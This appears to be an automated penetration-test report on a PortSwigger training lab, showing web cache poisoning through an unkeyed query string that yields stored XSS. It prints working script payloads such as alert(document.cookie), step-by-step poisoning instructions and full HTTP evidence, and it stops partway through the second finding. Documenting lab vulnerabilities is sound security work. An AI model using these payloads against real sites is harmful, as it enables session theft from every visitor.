# VERDICT Security Assessment Report

## Contents

- [Assessment Information](#assessment-information)
- [Scope](#scope)
- [Summary](#summary)
- [Findings](#findings)
    - [1. HIGH — xss-stored Web cache poisoning via unkeyed query string → XSS served to all home-page visitors](#finding-1)
    - [2. HIGH — misconfig Web cache poisoning via unkeyed query string → persistent XSS (alert(document.cookie)) served to every home-page visitor](#finding-2)
    - [3. HIGH — xss-stored Stored XSS via comment "website" field breaks out of anchor href on blog post pages](#finding-3)
    - [4. HIGH — burp✓ Input returned in response (stored)](#finding-4)
    - [5. MEDIUM — burp✓ Web cache poisoning (2 URLs)](#finding-5)
    - [6. LOW — burp Strict transport security not enforced (2 URLs)](#finding-6)
    - [7. INFO — burp TLS certificate](#finding-7)

## Assessment Information

| | |
|---|---|
| Assessment ID | `a-mr7xwt1b-os975r` |
| Target | https://0aed00ce03a7a9928062cb7000fa003d.web-security-academy.net/ |
| Started | 2026-07-05T15:22:34.637Z |
| Generated | 2026-07-05T17:50:55.756Z |
| Phase | report |
| Screens | 6 mapped · 6 scanned · 0 remaining |
| Hypotheses | 0 (0 confirmed) |
| Findings | 7 |
| Tooling | VERDICT |

## Scope

- **In-scope hosts**: `*.web-security-academy.net`
- **Out-of-scope hosts**: —
- **In-scope paths**: `/`
- **Out-of-scope paths**: —
- **Rate**: 30 req/min, max 2 concurrent

## Summary

7 finding(s): 4 high, 1 medium, 1 low, 1 info

## Findings

<a id="finding-1"></a>

### 1. [HIGH] [xss-stored] Web cache poisoning via unkeyed query string → XSS served to all home-page visitors

- Screen: `s-0001`
- Source: validator `claude-pilot`
- Scope basis: authorized target https://0aed00ce03a7a9928062cb7000fa003d.web-security-academy.net/

The home page (GET /) reflects the request query string UNESCAPED into the href of the <link rel="canonical" href='//host/?...'/> tag inside <head>. A single quote closes the attribute and > closes the <link> tag, permitting arbitrary HTML/JS injection: e.g. ?to='><img src=x onerror=alert(document.domain)> or ?to='><script>...</script>. The <, >, and ' characters are reflected raw (confirmed in ev-mr7yiu5n-g: <link rel="canonical" href='//host/?to='><img src=x onerror=alert(1)>'/>), whereas a benign value reflects as inert text (control ev-mr7yh4bw-c: ?to=zqxUNIQ987marker).

Crucially, the caching layer in front of the app EXCLUDES the query string from the cache key (unkeyed query). A response poisoned by an attacker's GET /?to=<payload> is therefore stored and served to every subsequent visitor of / regardless of the query they send. This was directly observed: after GET /?to=BENIGNzzzvalue the cache returned that same response for GET /?to='><img...> (ev-mr7ylr1e-o, ev-mr7ylvbz-p), and later served the traversal-probe payload and a bare canonical to unrelated img requests — one query value's response delivered to requests bearing different query values.

Impact is stored-XSS-class: the injected script executes automatically in the browser of any user loading the home page, with no per-victim crafted link and no interaction. Ground-truth confirmation: browser navigation to /?to='><script>document.title='PWNED123XSS'</script> executed the script (document.title became PWNED123XSS) and the PortSwigger lab registered as Solved. The page's own base64 objective decodes to: "The victim user regularly visits the home page using Chrome. Invoke alert(document.cookie)" — exactly the achieved effect via cache poisoning.

**Reproduction**

```
1. Negative control: GET /?to=zqxUNIQ987marker → canonical href reflects the value as plain text with no tag breakout (ev-mr7yh4bw-c). No script/img injected.
2. Positive: GET /?to=%27%3E%3Cimg%20src%3Dx%20onerror%3Dalert(document.domain)%3E → response contains raw <link rel="canonical" href='//host/?to='><img src=x onerror=alert(1)>'/> — the ' closes the attribute, > closes the tag, and <img onerror> is injected as live HTML in <head> (ev-mr7yiu5n-g; repro ev-mr7yi7sz-e via filter-bypass corpus, img-onerror survived unescaped, htmlResponse:true).
3. Execution proof: navigate a browser to GET /?to='><script>document.title='PWNED123XSS'</script> → the injected inline script executes, document.title changes to PWNED123XSS, and the lab banner changes to "Solved / Congratulations, you solved the lab!".
4. Cache poisoning: because the cache key omits the query string, the poisoned response is served to all visitors of / — observed as GET /?to=<img...> returning the previously-cached response of a different query value (ev-mr7ylr1e-o, ev-mr7ylvbz-p, ev-mr7yr6a3-s). An attacker poisons the cache once; every subsequent home-page visitor's browser runs the attacker's JavaScript.
Remediation: HTML-encode the reflected query string in the canonical href (encode ' < >), and include the full query string in the cache key (or mark such responses no-store / Cache-Control: private).
```

**Evidence**

- Evidence `ev-mr7yh4bw-c` — `artifacts/s-0001/ev-mr7yh4bw-c/`

Request:

```http
GET /?to=zqxUNIQ987marker HTTP/1.1
Host: 0aed00ce03a7a9928062cb7000fa003d.web-security-academy.net
user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36
x-verdict: assessment
```

Response:

```http
HTTP/1.1 200
age: 0
cache-control: max-age=35
content-length: 9291
content-type: text/html; charset=utf-8
set-cookie: <redacted>
x-cache: miss
x-frame-options: SAMEORIGIN

<!DOCTYPE html>
<html>
<!--LAB_HEAD_START-->
    <head>
        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>
        <link href=/resources/css/labsBlog.css rel=stylesheet>
        <link rel="canonical" href='//0aed00ce03a7a9928062cb7000fa003d.web-security-academy.net/?to=zqxUNIQ987marker'/>
        <title>Mystery challenge</title>
    </head>
<!--LAB_HEAD_END-->
    <body>
        <script src="/resources/labheader/js/labHeader.js"></script>
        <!--LAB_HEADER_START-->
        <div id="academyLabHeader">
            <section class='academyLabBanner'>
                <div class=container>
                    <div class=logo></div>
                        <div class=title-container>
                            <h2>Mystery challenge</h2>
                            <button id='submitSolution' class='button' method='POST' path='/submitSolution' parameter='answer' data-answer-prompt='Solution (may not be required, depending on lab - reveal objective for more information)'>Submit solution</button>
                            <script src='/resources/labheader/js/submitSolution.js'></script>
                            <a class=link-back href='https://portswigger.net/web-security/dashboard'>
                                Back&nbsp;to&nbsp;lab&nbsp;dashboard&nbsp;
                                <svg version=1.1 id=Layer_1 xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' x=0px y=0px viewBox='0 0 28 30' enable-background='new 0 0 28 30' xml:space=preserve title=back-arrow>
                                    <g>
                                        <polygon points='1.4,0 0,1.2 12.6,15 0,28.8 1.4,30 15.1,15'></polygon>
                                        <polygon points='14.3,0 12.9,1.2 25.6,15 12.9,28.8 14.3,30 28,15'></polygon>
                                    </g>
                                </svg>
                            </a>
                            <br/><div id=mysteryObjective><a id=mysteryReveal data-hidden-objective='VGhlIHZpY3RpbSB1c2VyIHJlZ3VsYXJseSB2aXNpdHMgdGhlIGhvbWUgcGFnZSB1c2luZyBDaHJvbWUuIEludm9rZSA8Y29kZT5hbGVydChkb2N1bWVudC5jb29raWUpPC9jb2RlPiBpbiB0aGVpciBicm93c2VyLg==' data-hidden-link='aHR0cHM6Ly9wb3J0c3dpZ2dlci5uZXQvd2ViLXNlY3VyaXR5L3dlYi1jYWNoZS1wb2lzb25pbmcvZXhwbG9pdGluZy1pbXBsZW1lbnRhdGlvbi1mbGF3cy9sYWItd2ViLWNhY2hlLXBvaXNvbmluZy11bmtleWVkLXF1ZXJ5'>
                                Reveal&nbsp;objective&nbsp;
                            </a></div>
                            <script src='/resources/labheader/js/mysteryObjective.js'></script>
                        </div>
                        <div class='widgetcontainer-lab-status is-notsolved'>
                            <span>LAB</span>
                            <p>Not solved</p>
                            <span class=lab-status-icon></span>
                        </div>
                    </div>
                </div>
            </section>
        </div>
        <!--LAB_HEADER_END-->
        <div theme="blog">
            <section class="maincontainer">
                <div class="container is-page">
                    <header class="navigation-header">
                        <section class="top-links">
                            <a href=/>Home</a><p>|</p>
                        </section>
                    </header>
                    <header class="notification-header">
                    </header>
                    <section class="blog-header">
                        <img src="/resources/images/blog.svg">
                    </section>
                    <section class="blog-list">
                        <div class="blog-post">
                        <a href="/post?postId=10"><img src="/image/blog/posts/55.jpg"></a>
                        <h2>I'm At A Loss Without It - Leaving Your Smartphone Behind</h2>
                        <p>The other day I left my purse in a friend's car. This led to the most disturbing 19 hours of my life until it was returned to me.</p>
                        <a class="button is-small" href="/post?postId=10">View post</a>
                        </div>
                        <div class="blog-post">
                        <a href="/post?postId=2"><img src="/image/blog/posts/50.jpg"></a>
                        <h2>Smart Recognition</h2>
                        <p>The techie folks have done it again. Yet another way to secure your cell, and other electronic gadgets. This Smart Recognition is like no other you've met with yet. It all comes down to the scent of your hair, your...</p>
                        <a class="button is-small" href="/post?postId=2">View post</a>
                        </div>
                        <div class="blog-post">
                        <a href="/post?postId=8"><img src="/image/blog/posts/8.jpg"></a>
                        <h2>Grandma's on the net</h2>
                        <p>I love old people and technology. I love the language they use, where they have to put the word 'the' in front of everything. The Facebook, The Twitter...the ones I love the most are the ones who show they have...</p>
                        <a class="button is-small" href="/post?postId=8">View post</a>
                        </div>
                        <div class="blog-post">
                        <a href="/post?postId=6"><img src="/image/blog/posts/62.jpg"></a>
                        <h2>No Silly Names, Please</h2>
                        <p>We hear about it all the time, the unusual names people have given their children. I say unusual to be polite because, to be honest, some of them are just downright ridiculous. Have these parents no idea of the pressure...</p>
                        <a class="button is-small" href="/post?postId=6">View post</a>
                        </div>
                        <div class="blog-post">
                        <a href="/post?postId=9"><img src="/image/blog/posts/48.jpg"></a>
                        <h2>Look No Hands - The Game Plays Itself</h2>
                        <p>I was so fed up with my husband always sitting in front of the television playing his silly games, I did something about it. I came up with an idea that would revolutionize game playing in the future. I wrote...</p>
                        <a class="button is-small" href="/post?postId=9">View post</a>
                        </div>
                        <div class="blog-post">
                        <a href="/post?postId=3"><img src="/image/blog/posts/1.jpg"></a>
                        <h2>It's All in the Game - Football for Dummies</h2>
                        <p>There are two types of people in the world; those who watch soccer, and those who watch people watching soccer. I fall into the latter category. If only they'd leave me in peace to drink my beer and zone out....</p>
                        <a class="button is-small" href="/post?postId=3">View post</a>
                        </div>
                        <div class="blog-post">
                        <a href="/post?postId=1"><img src="/image/blog/posts/39.jpg"></a>
                        <h2>The Art Of Communication</h2>
                        <p>I'm a bit of a Francophile, so when I travel to France I love to speak their language. I'm by no means fluent but I give it my best shot. I usually travel with my partner and son, neither of...</p>
                        <a class="button is-small" href="/post?postId=1">View post</a>
                        </div>
                        <div class="blog-post">
                        <a href="/post?postId=4"><img src="/image/blog/posts/53.jpg"></a>
                        <h2>No More Burping Out Loud Guys</h2>
                        <p>One young woman fed up with her workmates burping out loud in the office took matters into her own hands.</p>
                        <a class="button is-small" href="/post?postId=4">View post</a>
                        </div>
                        <div class="blog-post">
                        <a href="/post?postId=7"><img src="/image/blog/posts/10.jpg"></a>
                        <h2>I'm A Photoshopped Girl Living In A Photoshopped World</h2>
                        <p>I don't know what I look like anymore. I never use a mirror, I just look at selfies and use the mirror App on my cell. The mirror App is cool, I always look amazing, and I can change my...</p>
                        <a class="button is-small" href="/post?postId=7">View post</a>
                        </div>
                        <div class="blog-post">
                        <a href="/post?postId=5"><img src="/image/blog/posts/18.jpg"></a>
                        <h2>Protect Your Smart Home Gadgets From Cyber Attacks</h2>
                        <p>While we've been sleeping in beds that don't cook breakfast and having to switch the overhead lights on ourselves, some of the more privileged in our communities have been under attack. A home invasion of a different kind. The attacks...</p>
                        <a class="button is-small" href="/post?postId=5">View post</a>
                        </div>
                    </section>
                </div>
            </section>
            <div class="footer-wrapper">
            </div>
        </div>
    </body>
</html>
```

- Evidence `ev-mr7yiu5n-g` — `artifacts/s-0001/ev-mr7yiu5n-g/`

Request:

```http
GET /?to=%27%3E%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E HTTP/1.1
Host: 0aed00ce03a7a9928062cb7000fa003d.web-security-academy.net
user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36
x-verdict: assessment
```

Response:

```http
HTTP/1.1 200
age: 0
cache-control: max-age=35
content-length: 9305
content-type: text/html; charset=utf-8
set-cookie: <redacted>
x-cache: miss
x-frame-options: SAMEORIGIN

<!DOCTYPE html>
<html>
<!--LAB_HEAD_START-->
    <head>
        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>
        <link href=/resources/css/labsBlog.css rel=stylesheet>
        <link rel="canonical" href='//0aed00ce03a7a9928062cb7000fa003d.web-security-academy.net/?to='><img src=x onerror=alert(1)>'/>
        <title>Mystery challenge</title>
    </head>
<!--LAB_HEAD_END-->
    <body>
        <script src="/resources/labheader/js/labHeader.js"></script>
        <!--LAB_HEADER_START-->
        <div id="academyLabHeader">
            <section class='academyLabBanner'>
                <div class=container>
                    <div class=logo></div>
                        <div class=title-container>
                            <h2>Mystery challenge</h2>
                            <button id='submitSolution' class='button' method='POST' path='/submitSolution' parameter='answer' data-answer-prompt='Solution (may not be required, depending on lab - reveal objective for more information)'>Submit solution</button>
                            <script src='/resources/labheader/js/submitSolution.js'></script>
                            <a class=link-back href='https://portswigger.net/web-security/dashboard'>
                                Back&nbsp;to&nbsp;lab&nbsp;dashboard&nbsp;
                                <svg version=1.1 id=Layer_1 xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' x=0px y=0px viewBox='0 0 28 30' enable-background='new 0 0 28 30' xml:space=preserve title=back-arrow>
                                    <g>
                                        <polygon points='1.4,0 0,1.2 12.6,15 0,28.8 1.4,30 15.1,15'></polygon>
                                        <polygon points='14.3,0 12.9,1.2 25.6,15 12.9,28.8 14.3,30 28,15'></polygon>
                                    </g>
                                </svg>
                            </a>
                            <br/><div id=mysteryObjective><a id=mysteryReveal data-hidden-objective='VGhlIHZpY3RpbSB1c2VyIHJlZ3VsYXJseSB2aXNpdHMgdGhlIGhvbWUgcGFnZSB1c2luZyBDaHJvbWUuIEludm9rZSA8Y29kZT5hbGVydChkb2N1bWVudC5jb29raWUpPC9jb2RlPiBpbiB0aGVpciBicm93c2VyLg==' data-hidden-link='aHR0cHM6Ly9wb3J0c3dpZ2dlci5uZXQvd2ViLXNlY3VyaXR5L3dlYi1jYWNoZS1wb2lzb25pbmcvZXhwbG9pdGluZy1pbXBsZW1lbnRhdGlvbi1mbGF3cy9sYWItd2ViLWNhY2hlLXBvaXNvbmluZy11bmtleWVkLXF1ZXJ5'>
                                Reveal&nbsp;objective&nbsp;
                            </a></div>
                            <script src='/resources/labheader/js/mysteryObjective.js'></script>
                        </div>
                        <div class='widgetcontainer-lab-status is-notsolved'>
                            <span>LAB</span>
                            <p>Not solved</p>
                            <span class=lab-status-icon></span>
                        </div>
                    </div>
                </div>
            </section>
        </div>
        <!--LAB_HEADER_END-->
        <div theme="blog">
            <section class="maincontainer">
                <div class="container is-page">
                    <header class="navigation-header">
                        <section class="top-links">
                            <a href=/>Home</a><p>|</p>
                        </section>
                    </header>
                    <header class="notification-header">
                    </header>
                    <section class="blog-header">
                        <img src="/resources/images/blog.svg">
                    </section>
                    <section class="blog-list">
                        <div class="blog-post">
                        <a href="/post?postId=10"><img src="/image/blog/posts/55.jpg"></a>
                        <h2>I'm At A Loss Without It - Leaving Your Smartphone Behind</h2>
                        <p>The other day I left my purse in a friend's car. This led to the most disturbing 19 hours of my life until it was returned to me.</p>
                        <a class="button is-small" href="/post?postId=10">View post</a>
                        </div>
                        <div class="blog-post">
                        <a href="/post?postId=2"><img src="/image/blog/posts/50.jpg"></a>
                        <h2>Smart Recognition</h2>
                        <p>The techie folks have done it again. Yet another way to secure your cell, and other electronic gadgets. This Smart Recognition is like no other you've met with yet. It all comes down to the scent of your hair, your...</p>
                        <a class="button is-small" href="/post?postId=2">View post</a>
                        </div>
                        <div class="blog-post">
                        <a href="/post?postId=8"><img src="/image/blog/posts/8.jpg"></a>
                        <h2>Grandma's on the net</h2>
                        <p>I love old people and technology. I love the language they use, where they have to put the word 'the' in front of everything. The Facebook, The Twitter...the ones I love the most are the ones who show they have...</p>
                        <a class="button is-small" href="/post?postId=8">View post</a>
                        </div>
                        <div class="blog-post">
                        <a href="/post?postId=6"><img src="/image/blog/posts/62.jpg"></a>
                        <h2>No Silly Names, Please</h2>
                        <p>We hear about it all the time, the unusual names people have given their children. I say unusual to be polite because, to be honest, some of them are just downright ridiculous. Have these parents no idea of the pressure...</p>
                        <a class="button is-small" href="/post?postId=6">View post</a>
                        </div>
                        <div class="blog-post">
                        <a href="/post?postId=9"><img src="/image/blog/posts/48.jpg"></a>
                        <h2>Look No Hands - The Game Plays Itself</h2>
                        <p>I was so fed up with my husband always sitting in front of the television playing his silly games, I did something about it. I came up with an idea that would revolutionize game playing in the future. I wrote...</p>
                        <a class="button is-small" href="/post?postId=9">View post</a>
                        </div>
                        <div class="blog-post">
                        <a href="/post?postId=3"><img src="/image/blog/posts/1.jpg"></a>
                        <h2>It's All in the Game - Football for Dummies</h2>
                        <p>There are two types of people in the world; those who watch soccer, and those who watch people watching soccer. I fall into the latter category. If only they'd leave me in peace to drink my beer and zone out....</p>
                        <a class="button is-small" href="/post?postId=3">View post</a>
                        </div>
                        <div class="blog-post">
                        <a href="/post?postId=1"><img src="/image/blog/posts/39.jpg"></a>
                        <h2>The Art Of Communication</h2>
                        <p>I'm a bit of a Francophile, so when I travel to France I love to speak their language. I'm by no means fluent but I give it my best shot. I usually travel with my partner and son, neither of...</p>
                        <a class="button is-small" href="/post?postId=1">View post</a>
                        </div>
                        <div class="blog-post">
                        <a href="/post?postId=4"><img src="/image/blog/posts/53.jpg"></a>
                        <h2>No More Burping Out Loud Guys</h2>
                        <p>One young woman fed up with her workmates burping out loud in the office took matters into her own hands.</p>
                        <a class="button is-small" href="/post?postId=4">View post</a>
                        </div>
                        <div class="blog-post">
                        <a href="/post?postId=7"><img src="/image/blog/posts/10.jpg"></a>
                        <h2>I'm A Photoshopped Girl Living In A Photoshopped World</h2>
                        <p>I don't know what I look like anymore. I never use a mirror, I just look at selfies and use the mirror App on my cell. The mirror App is cool, I always look amazing, and I can change my...</p>
                        <a class="button is-small" href="/post?postId=7">View post</a>
                        </div>
                        <div class="blog-post">
                        <a href="/post?postId=5"><img src="/image/blog/posts/18.jpg"></a>
                        <h2>Protect Your Smart Home Gadgets From Cyber Attacks</h2>
                        <p>While we've been sleeping in beds that don't cook breakfast and having to switch the overhead lights on ourselves, some of the more privileged in our communities have been under attack. A home invasion of a different kind. The attacks...</p>
                        <a class="button is-small" href="/post?postId=5">View post</a>
                        </div>
                    </section>
                </div>
            </section>
            <div class="footer-wrapper">
            </div>
        </div>
    </body>
</html>
```

- Evidence `ev-mr7yi7sz-e` — `artifacts/s-0001/ev-mr7yi7sz-e/`

Request:

```http
GET /?to=%3Cimg+src%3Dx+onerror%3Dalert%28%27xZmr7yhq5nkfcz%27%29%3E HTTP/1.1
Host: 0aed00ce03a7a9928062cb7000fa003d.web-security-academy.net
user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36
x-verdict: assessment
```

Response:

```http
HTTP/1.1 200
age: 11
cache-control: max-age=35
content-length: 9318
content-type: text/html; charset=utf-8
x-cache: hit
x-frame-options: SAMEORIGIN

<!DOCTYPE html>
<html>
<!--LAB_HEAD_START-->
    <head>
        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>
        <link href=/resources/css/labsBlog.css rel=stylesheet>
        <link rel="canonical" href='//0aed00ce03a7a9928062cb7000fa003d.web-security-academy.net/?to=<img src=x onerror=alert('xZmr7yhq5nkfcz')>'/>
        <title>Mystery challenge</title>
    </head>
<!--LAB_HEAD_END-->
    <body>
        <script src="/resources/labheader/js/labHeader.js"></script>
        <!--LAB_HEADER_START-->
        <div id="academyLabHeader">
            <section class='academyLabBanner'>
                <div class=container>
                    <div class=logo></div>
                        <div class=title-container>
                            <h2>Mystery challenge</h2>
                            <button id='submitSolution' class='button' method='POST' path='/submitSolution' parameter='answer' data-answer-prompt='Solution (may not be required, depending on lab - reveal objective for more information)'>Submit solution</button>
                            <script src='/resources/labheader/js/submitSolution.js'></script>
                            <a class=link-back href='https://portswigger.net/web-security/dashboard'>
                                Back&nbsp;to&nbsp;lab&nbsp;dashboard&nbsp;
                                <svg version=1.1 id=Layer_1 xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' x=0px y=0px viewBox='0 0 28 30' enable-background='new 0 0 28 30' xml:space=preserve title=back-arrow>
                                    <g>
                                        <polygon points='1.4,0 0,1.2 12.6,15 0,28.8 1.4,30 15.1,15'></polygon>
                                        <polygon points='14.3,0 12.9,1.2 25.6,15 12.9,28.8 14.3,30 28,15'></polygon>
                                    </g>
                                </svg>
                            </a>
                            <br/><div id=mysteryObjective><a id=mysteryReveal data-hidden-objective='VGhlIHZpY3RpbSB1c2VyIHJlZ3VsYXJseSB2aXNpdHMgdGhlIGhvbWUgcGFnZSB1c2luZyBDaHJvbWUuIEludm9rZSA8Y29kZT5hbGVydChkb2N1bWVudC5jb29raWUpPC9jb2RlPiBpbiB0aGVpciBicm93c2VyLg==' data-hidden-link='aHR0cHM6Ly9wb3J0c3dpZ2dlci5uZXQvd2ViLXNlY3VyaXR5L3dlYi1jYWNoZS1wb2lzb25pbmcvZXhwbG9pdGluZy1pbXBsZW1lbnRhdGlvbi1mbGF3cy9sYWItd2ViLWNhY2hlLXBvaXNvbmluZy11bmtleWVkLXF1ZXJ5'>
                                Reveal&nbsp;objective&nbsp;
                            </a></div>
                            <script src='/resources/labheader/js/mysteryObjective.js'></script>
                        </div>
                        <div class='widgetcontainer-lab-status is-notsolved'>
                            <span>LAB</span>
                            <p>Not solved</p>
                            <span class=lab-status-icon></span>
                        </div>
                    </div>
                </div>
            </section>
        </div>
        <!--LAB_HEADER_END-->
        <div theme="blog">
            <section class="maincontainer">
                <div class="container is-page">
                    <header class="navigation-header">
                        <section class="top-links">
                            <a href=/>Home</a><p>|</p>
                        </section>
                    </header>
                    <header class="notification-header">
                    </header>
                    <section class="blog-header">
                        <img src="/resources/images/blog.svg">
                    </section>
                    <section class="blog-list">
                        <div class="blog-post">
                        <a href="/post?postId=10"><img src="/image/blog/posts/55.jpg"></a>
                        <h2>I'm At A Loss Without It - Leaving Your Smartphone Behind</h2>
                        <p>The other day I left my purse in a friend's car. This led to the most disturbing 19 hours of my life until it was returned to me.</p>
                        <a class="button is-small" href="/post?postId=10">View post</a>
                        </div>
                        <div class="blog-post">
                        <a href="/post?postId=2"><img src="/image/blog/posts/50.jpg"></a>
                        <h2>Smart Recognition</h2>
                        <p>The techie folks have done it again. Yet another way to secure your cell, and other electronic gadgets. This Smart Recognition is like no other you've met with yet. It all comes down to the scent of your hair, your...</p>
                        <a class="button is-small" href="/post?postId=2">View post</a>
                        </div>
                        <div class="blog-post">
                        <a href="/post?postId=8"><img src="/image/blog/posts/8.jpg"></a>
                        <h2>Grandma's on the net</h2>
                        <p>I love old people and technology. I love the language they use, where they have to put the word 'the' in front of everything. The Facebook, The Twitter...the ones I love the most are the ones who show they have...</p>
                        <a class="button is-small" href="/post?postId=8">View post</a>
                        </div>
                        <div class="blog-post">
                        <a href="/post?postId=6"><img src="/image/blog/posts/62.jpg"></a>
                        <h2>No Silly Names, Please</h2>
                        <p>We hear about it all the time, the unusual names people have given their children. I say unusual to be polite because, to be honest, some of them are just downright ridiculous. Have these parents no idea of the pressure...</p>
                        <a class="button is-small" href="/post?postId=6">View post</a>
                        </div>
                        <div class="blog-post">
                        <a href="/post?postId=9"><img src="/image/blog/posts/48.jpg"></a>
                        <h2>Look No Hands - The Game Plays Itself</h2>
                        <p>I was so fed up with my husband always sitting in front of the television playing his silly games, I did something about it. I came up with an idea that would revolutionize game playing in the future. I wrote...</p>
                        <a class="button is-small" href="/post?postId=9">View post</a>
                        </div>
                        <div class="blog-post">
                        <a href="/post?postId=3"><img src="/image/blog/posts/1.jpg"></a>
                        <h2>It's All in the Game - Football for Dummies</h2>
                        <p>There are two types of people in the world; those who watch soccer, and those who watch people watching soccer. I fall into the latter category. If only they'd leave me in peace to drink my beer and zone out....</p>
                        <a class="button is-small" href="/post?postId=3">View post</a>
                        </div>
                        <div class="blog-post">
                        <a href="/post?postId=1"><img src="/image/blog/posts/39.jpg"></a>
                        <h2>The Art Of Communication</h2>
                        <p>I'm a bit of a Francophile, so when I travel to France I love to speak their language. I'm by no means fluent but I give it my best shot. I usually travel with my partner and son, neither of...</p>
                        <a class="button is-small" href="/post?postId=1">View post</a>
                        </div>
                        <div class="blog-post">
                        <a href="/post?postId=4"><img src="/image/blog/posts/53.jpg"></a>
                        <h2>No More Burping Out Loud Guys</h2>
                        <p>One young woman fed up with her workmates burping out loud in the office took matters into her own hands.</p>
                        <a class="button is-small" href="/post?postId=4">View post</a>
                        </div>
                        <div class="blog-post">
                        <a href="/post?postId=7"><img src="/image/blog/posts/10.jpg"></a>
                        <h2>I'm A Photoshopped Girl Living In A Photoshopped World</h2>
                        <p>I don't know what I look like anymore. I never use a mirror, I just look at selfies and use the mirror App on my cell. The mirror App is cool, I always look amazing, and I can change my...</p>
                        <a class="button is-small" href="/post?postId=7">View post</a>
                        </div>
                        <div class="blog-post">
                        <a href="/post?postId=5"><img src="/image/blog/posts/18.jpg"></a>
                        <h2>Protect Your Smart Home Gadgets From Cyber Attacks</h2>
                        <p>While we've been sleeping in beds that don't cook breakfast and having to switch the overhead lights on ourselves, some of the more privileged in our communities have been under attack. A home invasion of a different kind. The attacks...</p>
                        <a class="button is-small" href="/post?postId=5">View post</a>
                        </div>
                    </section>
                </div>
            </section>
            <div class="footer-wrapper">
            </div>
        </div>
    </body>
</html>
```

<a id="finding-2"></a>

### 2. [HIGH] [misconfig] Web cache poisoning via unkeyed query string → persistent XSS (alert(document.cookie)) served to every home-page visitor

- Screen: `(cross-screen)`
- Source: validator `claude-pilot`
- Scope basis: authorized target https://0aed00ce03a7a9928062cb7000fa003d.web-security-academy.net/

GET / reflects the entire request query string, unescaped, into the href of the <link rel="canonical"> element in the document <head>. The front-end cache EXCLUDES the query string from the cache key (unkeyed query string): a request to /?to=<value> is stored under, and served from, the same cache entry as plain GET /. Chaining the two flaws turns a reflected XSS into a persistent, cross-victim one (web cache poisoning).

An attacker requests /?to='"><script>alert(document.cookie)</script>. The single quote closes the canonical href attribute, "> closes the <link> tag, and the trailing <script> becomes a live element in <head> that runs in the visitor's browser. Because the query string is unkeyed, that poisoned response is cached under the key for plain GET /, so every subsequent visitor loading the home page WITHOUT any query string is served the attacker's script and executes alert(document.cookie) — enabling mass session-cookie theft/account takeover of all home-page visitors (including admins). This is the vulnerability the 'Mystery challenge' lab (web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-unkeyed-query) marks Solved.

Root cause: query string omitted from the cache key + query string reflected into HTML without contextual output encoding. This is the multi-step / stateful mechanism (poison-then-serve across separate requests) distinct from the single-request reflected XSS already recorded as xss-stored::/::to in diagnosis. NB: the &pad=AAAA… segment in the evidence requests is only a benign length-distinguisher for evidence tooling; the working payload is the unpadded '"><script>alert(document.cookie)</script>.

**Reproduction**

```
1. Negative control — GET / (no query string): 200, 12050 bytes, canonical = href='//HOST/' with no script (ev-mr822ki0-62).
2. Poison — GET /?to=%27%22%3E%3Cscript%3Ealert(document.cookie)%3C%2Fscript%3E (optionally &pad=AAA… to inflate length): on a cache miss the origin reflects the payload into the canonical href unescaped and caches it under the keyless / entry (ev-mr822orx-63: 200, 12471 bytes, Set-Cookie present = origin/miss; canonical = href='//HOST/?to='"><script>alert(document.cookie)</script>&pad=AAA…').
3. Victim view — GET / (no query string at all): 200, 12471 bytes, canonical now contains the live <script>alert(document.cookie)</script> served from the poisoned cache (ev-mr822t1l-64 and ev-mr822xay-65 — two stable positives; two further reads ev-mr8231ko-66 / ev-mr8235u8-67 also poisoned).
The identical plain-/ URL returns clean (step 1) before the poison and the executing script (step 3) after, proving the separate /?to= request poisoned the home page for all visitors. Cache TTL is short (~1s), so resend the poison until it lands on a miss (~1 in 2 attempts).
```

**Evidence**

- Evidence `ev-mr822ki0-62` — `artifacts/_/ev-mr822ki0-62/`

Request:

```http
GET / HTTP/1.1
Host: 0aed00ce03a7a9928062cb7000fa003d.web-security-academy.net
user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36
x-verdict: assessment
```

Response:

```http
HTTP/1.1 200
age: 30
cache-control: max-age=35
content-length: 12050
content-type: text/html; charset=utf-8
x-cache: hit
x-frame-options: SAMEORIGIN

<!DOCTYPE html>
<html>
<!--LAB_HEAD_START-->
    <head>
        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>
        <link href=/resources/css/labsBlog.css rel=stylesheet>
        <link rel="canonical" href='//0aed00ce03a7a9928062cb7000fa003d.web-security-academy.net/'/>
        <title>Mystery challenge</title>
    </head>
<!--LAB_HEAD_END-->
    <body>
        <script src="/resources/labheader/js/labHeader.js"></script>
        <!--LAB_HEADER_START-->
        <div id="academyLabHeader">
            <section class='academyLabBanner is-solved'>
                <div class=container>
                    <div class=logo></div>
                        <div class=title-container>
                            <h2>Mystery challenge</h2>
                            <a class=link-back href='https://portswigger.net/web-security/dashboard'>
                                Back&nbsp;to&nbsp;lab&nbsp;dashboard&nbsp;
                                <svg version=1.1 id=Layer_1 xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' x=0px y=0px viewBox='0 0 28 30' enable-background='new 0 0 28 30' xml:space=preserve title=back-arrow>
                                    <g>
                                        <polygon points='1.4,0 0,1.2 12.6,15 0,28.8 1.4,30 15.1,15'></polygon>
                                        <polygon points='14.3,0 12.9,1.2 25.6,15 12.9,28.8 14.3,30 28,15'></polygon>
                                    </g>
                                </svg>
                            </a>
